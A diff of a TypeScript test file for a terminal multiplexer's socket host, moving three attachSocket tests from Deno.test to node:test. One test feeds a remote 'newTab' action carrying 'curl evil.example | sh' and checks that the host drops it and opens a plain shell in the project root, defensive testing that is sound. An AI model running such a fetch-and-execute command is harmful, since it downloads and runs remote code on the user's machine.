@@ -1,5 +1,6 @@
 // Copyright 2023-present Eser Ozvataf and other contributors. All rights reserved. Apache-2.0 license.
 
+import * as nodeTest from "node:test";
 import * as assert from "@eserstack/test-kit/assert";
 import type * as mux from "@eserstack/mux";
 import { runtime } from "@eserstack/standards/cross-runtime";
@@ -79,66 +80,75 @@ const withHost = async (
 
 const ATTACH = { t: "attach", viewport: { cols: 80, rows: 24 } } as const;
 
-Deno.test("attachSocket sends the full scene to a socket that attaches", async () => {
-  await withHost((host) => {
-    const browser = fakeSocket();
+nodeTest.test(
+  "attachSocket sends the full scene to a socket that attaches",
+  async () => {
+    await withHost((host) => {
+      const browser = fakeSocket();
 
-    host.attachSocket(browser.asWebSocket);
-    browser.receive(ATTACH);
+      host.attachSocket(browser.asWebSocket);
+      browser.receive(ATTACH);
 
-    assert.assertEquals(browser.sent.length, 1);
-    const message = JSON.parse(browser.sent[0]!);
-    assert.assertEquals(message.t, "scene");
-    assert.assertEquals(message.full, true);
+      assert.assertEquals(browser.sent.length, 1);
+      const message = JSON.parse(browser.sent[0]!);
+      assert.assertEquals(message.t, "scene");
+      assert.assertEquals(message.full, true);
 
-    return Promise.resolve();
-  });
-});
-
-Deno.test("attachSocket strips the command a remote frame picks for a new tab", async () => {
-  await withHost((host, spawns, root) => {
-    const browser = fakeSocket();
-
-    host.attachSocket(browser.asWebSocket);
-    browser.receive(ATTACH);
-    browser.receive({
-      t: "action",
-      action: {
-        type: "newTab",
-        command: "sh",
-        args: ["-c", "curl evil.example | sh"],
-        cwd: "/",
-      },
+      return Promise.resolve();
     });
+  },
+);
 
-    // The pane still opens, with the resolver's shell in the project root
-    // instead of the frame's command line.
-    assert.assertEquals(spawns.length, 1);
-    assert.assertEquals(spawns[0]!.args, []);
-    assert.assertEquals(spawns[0]!.cwd, root);
+nodeTest.test(
+  "attachSocket strips the command a remote frame picks for a new tab",
+  async () => {
+    await withHost((host, spawns, root) => {
+      const browser = fakeSocket();
 
-    return Promise.resolve();
-  });
-});
+      host.attachSocket(browser.asWebSocket);
+      browser.receive(ATTACH);
+      browser.receive({
+        t: "action",
+        action: {
+          type: "newTab",
+          command: "sh",
+          args: ["-c", "curl evil.example | sh"],
+          cwd: "/",
+        },
+      });
 
-Deno.test("attachSocket closes the previous socket and stops at a closed one", async () => {
-  await withHost(async (host) => {
-    const first = fakeSocket();
-    const second = fakeSocket();
+      // The pane still opens, with the resolver's shell in the project root
+      // instead of the frame's command line.
+      assert.assertEquals(spawns.length, 1);
+      assert.assertEquals(spawns[0]!.args, []);
+      assert.assertEquals(spawns[0]!.cwd, root);
 
-    host.attachSocket(first.asWebSocket);
-    host.attachSocket(second.asWebSocket);
+      return Promise.resolve();
+    });
+  },
+);
 
-    assert.assertEquals(first.socket.readyState, WebSocket.CLOSED);
+nodeTest.test(
+  "attachSocket closes the previous socket and stops at a closed one",
+  async () => {
+    await withHost(async (host) => {
+      const first = fakeSocket();
+      const second = fakeSocket();
 
-    second.receive(ATTACH);
-    const sentBeforeClose = second.sent.length;
-    assert.assertEquals(sentBeforeClose, 1);
+      host.attachSocket(first.asWebSocket);
+      host.attachSocket(second.asWebSocket);
 
-    second.socket.close();
-    await host.createTab();
+      assert.assertEquals(first.socket.readyState, WebSocket.CLOSED);
 
-    assert.assertEquals(second.sent.length, sentBeforeClose);
-    assert.assertEquals(first.sent, []);
-  });
-});
+      second.receive(ATTACH);
+      const sentBeforeClose = second.sent.length;
+      assert.assertEquals(sentBeforeClose, 1);
+
+      second.socket.close();
+      await host.createTab();
+
+      assert.assertEquals(second.sent.length, sentBeforeClose);
+      assert.assertEquals(first.sent, []);
+    });
+  },
+);
